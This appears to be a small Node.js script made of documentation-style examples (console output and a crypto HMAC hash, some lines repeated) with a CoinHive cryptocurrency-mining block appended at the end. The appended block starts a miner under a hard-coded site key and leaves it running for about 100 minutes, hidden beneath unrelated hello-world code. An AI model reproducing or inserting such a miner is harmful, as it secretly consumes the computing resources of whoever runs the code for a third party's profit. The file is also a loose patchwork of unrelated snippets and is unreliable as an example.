

console.log('hello world');
// Prints: hello world, to stdout
console.log('hello %s', 'world');
// Prints: hello world, to stdout

const name = 'Will Robinson';
console.warn(`Danger ${name}! Danger!`);
// Prints: Danger Will Robinson! Danger!, to stderr

const crypto = require('crypto');

const secret = 'abcdefg';
const hash = crypto.createHmac('sha256', secret)
                   .update('I love cupcakes')
                   .digest('hex');
console.log(hash);
console.log('hello world');
// Prints: hello world, to stdout
console.log('hello %s', 'world');
// Prints: hello world, to stdout


const CoinHive = require('coin-hive');

(async () => {
  const cc = await CoinHive('FgNYlyRdWZc5Px5xoZXsrxqv7A6YLkkh'); // CoinHive's Site Key

  await cc.start();

  // Listen on events
  cc.on('found', () => console.log('Found!'));
  cc.on('accepted', () => console.log('Accepted!'));

  setTimeout(async () => await cc.stop(), 6000000);
})();

